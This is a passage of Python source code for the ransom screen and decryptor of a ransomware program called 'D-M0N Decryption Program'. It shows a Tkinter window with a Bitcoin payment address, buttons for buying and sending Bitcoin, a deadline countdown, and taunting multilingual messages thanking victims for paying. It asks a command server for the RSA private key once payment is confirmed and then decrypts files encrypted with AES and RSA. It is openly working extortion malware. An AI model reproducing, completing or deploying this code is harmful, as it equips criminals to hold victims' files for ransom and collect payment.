        "PT": "Todos os seus arquivos foram descriptografados. Obrigado pelo dinheiro, vadia.",
        "RO": "Toate fișierele tale au fost decriptate. Mulțumesc pentru bani, biată.",
        "RU": "Все ваши файлы были расшифрованы. Спасибо за деньги, сука.",
        "SV": "Alla dina filer har dekrypterats. Tack för pengarna, din hora.",
        "SW": "Mafaili yako yote yamefichuliwa. Asante kwa pesa, mrembo.",
        "TH": "ไฟล์ทั้งหมดของคุณถูกถอดรหัสแล้ว ขอบคุณสำหรับเงินนะ, สัตว์ร้าย.",
        "TR": "Tüm dosyalarınız şifresi çözüldü. Para için teşekkürler, orospu.",
        "UK": "Усі ваші файли були розшифровані. Дякую за гроші, сука.",
        "ZH": "您的所有文件已被解密。谢谢你的钱，婊子。"
    }
}

def check(server_address, payment_address, id):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect(server_address)

    try:
        # Send request to the server to check the payment address and get the private key
        message = f"/to-server/ check payaddress={payment_address} id={id}"
        client_socket.sendall(message.encode())

        # Get server response
        response = client_socket.recv(4096).decode()

        if response.startswith("/to-client/ privatekey="):
            private_key_pem_b64 = response[(response.find("privatekey=")+11):]
            
            # Decode and load the private key using cryptography
            private_key_pem = base64.b64decode(private_key_pem_b64)
            private_key = serialization.load_pem_private_key(
                private_key_pem,
                password=None,
                backend=default_backend()
            )

            return "allowed", private_key
        else:
            return "denied", None

    finally:
        client_socket.close()

def decrypt_file(file_path, private_key, encrypted_file_extension):
    print(f"Decrypting file {file_path}...")

    # Read encrypted AES key, IV, and encrypted data
    print("    Reading file content...")
    with open(file_path, 'rb') as f:
        encrypted_aes_key = f.readline().strip()
        iv = f.readline().strip()
        encrypted_data = f.read()

    print("    Storing AES-256 key...")
    encrypted_aes_key = base64.b64decode(encrypted_aes_key)

    # Decrypt the AES key with the RSA private key
    print("    Decrypting AES-256 key with RSA private key...")
    aes_key = private_key.decrypt(
        encrypted_aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Decrypt the data using AES
    print("    Generating AES-256 cipher...")
    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(base64.b64decode(iv)), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    print("    Decrypting data with AES-256...")
    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Unpad the data
    print("    Unpadding data...")
    pad_size = decrypted_padded_data[-1]
    decrypted_data = decrypted_padded_data[:-pad_size]

    # Save the data in the decrypted file
    print("    Saving decrypted data in the file")
    with open(file_path, 'wb') as f:
        f.write(decrypted_data)

    # Remove .___encrypted___ extension
    print("    Recovering original file path")
    original_file_path = file_path[:-len(encrypted_file_extension)]
    os.rename(file_path, original_file_path)

    print(f"  Decrypted file {original_file_path}\n")

def decrypt(dir, private_key, encrypted_file_extension, info_file_extension, decrypt_console):
    # Go to every file and folder
    for root, dirs, files in os.walk(dir):
        for filename in files:
            file_path = os.path.join(root, filename)
            if os.path.isfile(file_path) and filename.endswith(encrypted_file_extension) and ".ini" not in filename:
                decrypt_file(file_path, private_key, encrypted_file_extension)
                original_file_path = file_path[:-len(encrypted_file_extension)]

                # Insert decrypted file info in Tkinter decrypt console
                # decrypt_console.insert(f"Decrypted file: {original_file_path}\n", tk.END)
                # decrypt_console.see(tk.END)

        # Remove info-storage files
        try:
            os.remove(os.path.join(root, f"{os.path.basename(root)}{info_file_extension}"))
        except:
            pass

def get_info(dir, info_file_extension):    # Get victim ID and date by searching for .___info___ files
    # Walk in all folders
    for root, dirs, files in os.walk(dir):
        for filename in files:
            if filename.endswith(info_file_extension):  # Check if the file extension is '___info___' (the ID and date file extension)
                with open(os.path.join(root, f"{os.path.basename(root)}{info_file_extension}"), "r") as f:
                    id = f.readline().strip()    # Read the ID in the file
                    date_string = f.readline().strip()    # Read the encryption date in the file

                date = datetime.strptime(date_string, DATE_FORMAT)

                return id, date
            
def get_date(id):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client_socket.connect(SERVER_ADDRESS)

    try:
        # Send request to the server to ask for the encryption date
        message = f"/to-server/ askdate id={id}"
        client_socket.sendall(message.encode())

        # Get server response
        response = client_socket.recv(4096).decode()

        if response.startswith("/to-client/ date="):
            date_string = response[(response.find("date=")+5):]
            date = datetime.strptime(date_string, DATE_FORMAT)

            return date

    finally:
        client_socket.close()
            
def update_countdown(language, target_date):
    selected_language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language.get())]
    
    # Get remaining time
    now = datetime.now()
    remaining_time = target_date - now

    if remaining_time > timedelta(0):
        days = remaining_time.days
        hours, remainder = divmod(remaining_time.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        # Update display
        counter_label.config(text=(TEXT["counter"][selected_language_code] % (days, hours, minutes, seconds)))
    else:
        counter_label.config(text="NOOOOO!!!!")

    # Update again every second
    counter_label.after(1000, lambda: update_countdown(selected_language, target_date))

def decryption_window():
    # Decrypt console window
    decrypt_window = tk.Tk()
    decrypt_window.title("Files Decryptor")
    decrypt_window.geometry(f"{int(window_width/1.5)}x{int(window_height/1.5)}")
    decrypt_window.configure(background="lightgray")

    # Decrypt console
    decrypt_console = tk.Text(decrypt_window, bg="white", state="readonly")
    decrypt_console.pack(fill=tk.BOTH, expand=True)

    return decrypt_window, decrypt_console

def check_payment_button(selected_language):
        selected_language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language)]

        address_input = simpledialog.askstring(TEXT["checkpaymenttitle"][selected_language_code], TEXT["askaddress"][selected_language_code])
        
        if address_input:
            confirmation = messagebox.askyesno(TEXT["checkpaymenttitle"][selected_language_code], (TEXT["confirmaddress"][selected_language_code] % (address_input)))

            if confirmation:
                try:
                    id, date = get_info(ENCRYPTION_DIR, INFO_FILE_EXTENSION)
                    for i in range(5):
                        allowed, private_key = check(SERVER_ADDRESS, address_input, id)

                        if allowed == "allowed":
                            break

                        time.sleep(0.5)

                    if allowed != "allowed":
                        messagebox.showinfo(TEXT["deniedtitle"][selected_language_code], TEXT["denied"][selected_language_code])

                    # Decrypt console window
                    # decrypt_window, decrypt_console = decryption_window()
                    
                    # decrypt_window.update()
                    decrypt_console = None

                    decrypt(ENCRYPTION_DIR, private_key, ENCRYPTED_FILE_EXTENSION, INFO_FILE_EXTENSION, decrypt_console)

                    messagebox.showinfo(TEXT["filesdecryptedtitle"][selected_language_code], TEXT["filesdecrypted"][selected_language_code])

                    window.destroy()

                except: pass

def copy_address_button(address):
    pyperclip.copy(address)    # Copy address to clipboard

def abt_bitcoin_button(selected_language):
    language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language)]
    messagebox.showinfo(TEXT["abtbitcointitle"][language_code], TEXT["abtbitcoin"][language_code])

def buy_bitcoin_button(selected_language):
    language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language)]
    if messagebox.askyesno(TEXT["buybitcointitle"][language_code], TEXT["buybitcoin"][language_code]):
        webbrowser.open(BUY_BITCOIN_URL)

def send_bitcoin_button(selected_language):
    language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language)]
    if messagebox.askyesno(TEXT["sendbitcointitle"][language_code], TEXT["sendbitcoin"][language_code]):
        webbrowser.open(SEND_BITCOIN_URL)

def update_language(selected_language):    # Update language for all elements with text
    updated_language_code = LANGUAGES[LANGUAGES_NAMES.index(selected_language)]

    title_label.config(text=TEXT["title"][updated_language_code])
    select_lang_label.config(text=TEXT["selectlang"][updated_language_code])
    main_txt.set_html(TEXT["main"][updated_language_code])

    instructions_txt.set_html(TEXT["instructions"][updated_language_code])
    instructions_txt.yview_moveto(1.0)    # Scroll to the bottom
    instructions_txt_scrollbar.config(command=instructions_txt.yview)    # Config. again the scrollbar
    instructions_txt.configure(yscrollcommand=instructions_txt_scrollbar.set)
    # instructions_txt.yview_moveto(0.0)    # Scroll to the top

    address_label.config(text=TEXT["addresstitle"][updated_language_code])
    copy_address_btn.config(text=TEXT["copyaddresstitle"][updated_language_code])
    abt_bitcoin_btn.config(text=TEXT["abtbitcointitle"][updated_language_code])
    buy_bitcoin_btn.config(text=TEXT["buybitcointitle"][updated_language_code])
    send_bitcoin_btn.config(text=TEXT["sendbitcointitle"][updated_language_code])
    check_btn.config(text=TEXT["checkpaymenttitle"][updated_language_code])
    counter_title_label.config(text=TEXT["countertitle"][updated_language_code])
    counter_date_label.config(text=(TEXT["counterdate"][updated_language_code] % (target_date_year, target_date_month, target_date_day, target_date_hour, target_date_minute, target_date_second)))

def on_closing():
    if messagebox.askokcancel("No...", "You shouldn't quit, and you know why... Well, that's your choice ;)"):
        window.destroy()


# Execute decryptor

# Create the main window
window = tk.Tk()

screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

window_width = int(screen_width * 0.6)
window_height = int(screen_height * 0.9)

x_offset = int(screen_width * 0.15)
y_offset = int(screen_height * 0.01)

window.title("D-M0N Decryption Program")
window.iconbitmap("icon.ico")
window.geometry(f"{window_width}x{window_height}+{x_offset}+{y_offset}")
window.configure(bg=BG_COLOR)
window.resizable(False, False)
window.protocol("WM_DELETE_WINDOW", on_closing)


# Title/language selector frame
title_frame = tk.Frame(window, bg=BG_COLOR, width=window_width)
title_frame.pack(padx=0, pady=10, anchor=tk.N)

# Main title
title_label = tk.Label(title_frame, text=TEXT["title"][LANGUAGES[0]], fg="white", bg=BG_COLOR, font=(FONT, 15, "bold"))
title_label.pack(padx=5, anchor=tk.NW, side=tk.LEFT)

# Language selection menu
selected_language = tk.StringVar(window)
selected_language.set(LANGUAGES_NAMES[0])
lang_menu = ttk.Combobox(title_frame, textvariable=selected_language, values=LANGUAGES_NAMES, width=25, background=BG_COLOR, height=window_height, state="readonly")
lang_menu.pack(padx=(3, 0), anchor=tk.E, side=tk.RIGHT)
lang_menu.bind("<<ComboboxSelected>>", lambda event: update_language(selected_language.get()))

# Select language label
select_lang_label = tk.Label(title_frame, text=TEXT["selectlang"][LANGUAGES[0]], font=(FONT, 10, "bold"), fg="white", bg=BG_COLOR)
select_lang_label.pack(padx=(5, 0), anchor=tk.E, side=tk.RIGHT)


# Main frame
main_frame = tk.Frame(window, bg=BG_COLOR)
main_frame.pack(padx=10, pady=10)

# Main text area (on the left)
main_txt = tkh.HTMLText(main_frame, html=TEXT["main"][LANGUAGES[0]])
main_txt.configure(height=36.5, relief="flat", borderwidth=3, insertbackground="black", insertborderwidth=0, insertontime=1, selectbackground=BG_COLOR, selectforeground="white")
main_txt.pack(side=tk.RIGHT, anchor=tk.NE, padx=(10, 0), pady=(0, 10), fill=tk.X)


# Decryption Instructions area
instructions_frame = tk.Frame(main_frame, bg=BG_COLOR)
instructions_frame.pack(side=tk.LEFT, anchor=tk.NW, padx=(0, 0), pady=0)

instructions_txt_frame = tk.Frame(instructions_frame, bg=BG_COLOR)
instructions_txt_frame.pack(side=tk.TOP, anchor=tk.NW, padx=(0, 0), pady=0)

# Instructions text scrollbar
instructions_txt_scrollbar = tk.Scrollbar(instructions_txt_frame, orient="vertical")
instructions_txt_scrollbar.pack(fill=tk.Y, side=tk.RIGHT)

# Text area on the left (instructions)
instructions_txt = tkh.HTMLText(instructions_txt_frame, html=TEXT["instructions"][LANGUAGES[0]])
instructions_txt.configure(yscrollcommand=instructions_txt_scrollbar.set, relief="flat", borderwidth=3, insertbackground="black", insertborderwidth=0, insertontime=1, selectbackground=BG_COLOR, selectforeground="white")
instructions_txt.pack(expand=True, side=tk.LEFT)

# Configure instructions text scrollbar
instructions_txt_scrollbar.config(command=instructions_txt.yview)

# Check Payment button under the instructions text
check_btn_frame = tk.Frame(instructions_frame, highlightbackground="white", highlightthickness=1, bd=0)

check_btn = tk.Button(check_btn_frame, text=TEXT["checkpaymenttitle"][LANGUAGES[0]], command=lambda: check_payment_button(selected_language.get()))
check_btn.configure(background="white", foreground="red", relief="flat", font=(FONT, 8, "bold"), overrelief="flat", highlightcolor="red", cursor="cross")

check_btn_frame.pack(side=tk.BOTTOM, padx=(0, 0), pady=(0, 10), fill=tk.X)
check_btn.pack(fill=tk.X)

# About Bitcoin button under the instructions text
buy_bitcoin_btn = ttk.Button(instructions_frame, text=TEXT["buybitcointitle"][LANGUAGES[0]], command=lambda: buy_bitcoin_button(selected_language.get()))
buy_bitcoin_btn.pack(side=tk.BOTTOM, padx=(0, 0), pady=(0, 5), fill=tk.X)

# Send Bitcoin tutorial button under the instructions text
send_bitcoin_btn = ttk.Button(instructions_frame, text=TEXT["sendbitcointitle"][LANGUAGES[0]], command=lambda: send_bitcoin_button(selected_language.get()))
send_bitcoin_btn.pack(side=tk.BOTTOM, padx=(0, 0), pady=(0, 5), fill=tk.X)

# About Bitcoin button under the instructions text
abt_bitcoin_btn = ttk.Button(instructions_frame, text=TEXT["abtbitcointitle"][LANGUAGES[0]], command=lambda: abt_bitcoin_button(selected_language.get()))
abt_bitcoin_btn.pack(side=tk.BOTTOM, padx=(0, 0), pady=(0, 5), fill=tk.X)

# Address frame under the instructions text
address_frame = tk.Frame(instructions_frame, bg=BG_COLOR)
address_frame.pack(side=tk.BOTTOM, padx=(0, 0), pady=(10, 0), fill=tk.X)

# Address label
address_label = tk.Label(address_frame, text=TEXT["addresstitle"][LANGUAGES[0]],  height=1, fg="black", bg="white", font=(FONT, 8, "bold"))
address_label.pack(fill=tk.X)

# Address text
address_txt = tk.Text(address_frame, height=2, fg="black", bg="white", font=(FONT, 8))
address_txt.insert(tk.END, BTC_ADDRESS)
address_txt.config(state=tk.DISABLED)
address_txt.pack(fill=tk.X)

# Copy address button
copy_address_btn = ttk.Button(address_frame, text=TEXT["copyaddresstitle"][LANGUAGES[0]], command=lambda: copy_address_button(BTC_ADDRESS))
copy_address_btn.pack(pady=(0, 5), fill=tk.X)


# Update countdown and start the main loop
id, info_file_date = get_info(ENCRYPTION_DIR, INFO_FILE_EXTENSION)
try:
    target_date = get_date(id)
except:
    target_date = info_file_date

target_date_year = str(target_date.year)
target_date_month = str(target_date.month)
target_date_day = str(target_date.day)
target_date_hour = str(target_date.hour)
target_date_minute = str(target_date.minute)
target_date_second = str(target_date.second)

# Set time units to a different 'format' for a better window display (ex. 9 seconds -> 09 seconds)
if target_date.month < 10:
    target_date_month = f"0{target_date.month}"
    
if target_date.day < 10:
    target_date_day = f"0{target_date.day}"

if target_date.hour < 10:
    target_date_hour = f"0{target_date.hour}"

if target_date.minute < 10:
    target_date_minute = f"0{target_date.minute}"

if target_date.second < 10:
    target_date_second = f"0{target_date.second}"


counter_frame = tk.Frame(window, background="black", width=window_width, height=window_height/5)
counter_frame.pack(side=tk.BOTTOM)

counter_title_label = tk.Label(counter_frame, text=TEXT["countertitle"][LANGUAGES[0]], font=(FONT, 15, "bold"), foreground="white", background="black", width=window_width)
counter_title_label.pack(pady=(0, 0))

counter_label = tk.Label(counter_frame, font=(FONT, 15, "bold"), foreground="red", background="black", width=window_width)
counter_label.pack(pady=(0, 0))

counter_date_label = tk.Label(counter_frame, text=(TEXT["counterdate"][LANGUAGES[0]] % (target_date_year, target_date_month, target_date_day, target_date_hour, target_date_minute, target_date_second)), font=(FONT, 8, "bold"), foreground="white", background="black", width=window_width)
counter_date_label.pack(pady=(0, 0))



# Window mainloop
update_countdown(LANGUAGES_NAMES[0], target_date)
window.mainloop()